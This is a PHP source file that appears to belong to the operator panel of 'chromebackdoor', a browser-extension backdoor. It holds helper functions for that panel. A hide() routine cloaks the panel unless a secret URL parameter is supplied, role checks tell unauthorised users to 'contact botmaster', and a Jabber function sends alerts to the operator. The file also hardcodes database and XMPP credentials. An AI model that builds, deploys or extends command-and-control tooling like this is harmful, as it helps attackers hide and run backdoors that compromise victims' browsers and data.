<?php
$bdd = new PDO('mysql:host=localhost;dbname=chrombackdoor-master','root','toor');
define('__VERSION__', '3.0');

function Checkupdate(){
    $new_version = file_get_contents('https://raw.githubusercontent.com/graniet/chromebackdoor/master/version.txt');
    if(trim($new_version) > __VERSION__){
        echo "New version available on : https://github.com/graniet/chromebackdoor/ <br />";
        exit(1);
    }
}

function hide(){
    global $bdd;
    $select = $bdd->prepare("SELECT * FROM settings");
    $select->execute();
    if($select->rowCount() > 0){
        $result = $select->fetch();
        if($result['hide_panel'] == '1' && $result['get_name'] != '' && $result['get_value'] != '' && !isset($_SESSION['username']) && !isset($_POST['login'])){
            if(!isset($_GET[$result['get_name']]) || $_GET[$result['get_name']] != $result['get_value']){
                exit();
            }
        }
    }
}

function right_user($username){
    global $bdd;
    $logs_right = array(0 => array('all'),
                        1 => array('panel'),
                        2 => array(''));
    $select = $bdd->prepare("SELECT * FROM utilisateurs WHERE username = :username");
    $select->bindParam(':username', $username);
    $select->execute();
    if($select->rowCount() > 0){
        $fetch = $select->fetch();
        if($fetch['username'] == $username){
            $droit = $fetch['roles'];
            if(isset($logs_right[$droit]) && $logs_right[$droit][0] != 'all'){
                if(!in_array($_GET['action'], $logs_right[$droit])){
                    echo "<center>Forbiden contact botmaster</center>";
                    exit(1);
                }
            }
        }
    }
}

function SendJabber($jabber_username, $jabber_password, $jabber_to, $message){
    require_once "lib/XMPPHP/XMPP.php";  
    $username = explode('@', $jabber_username);
    $conn = new XMPPHP_XMPP($username[1], 5222, $username[0], 'testtest31', 'ChromeBackdoor', $username[1], $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
    $conn->connect();
    $conn->processUntil('session_start');
    $conn->presence();
    $conn->message($jabber_to, $message);
    $conn->disconnect();
}
?>
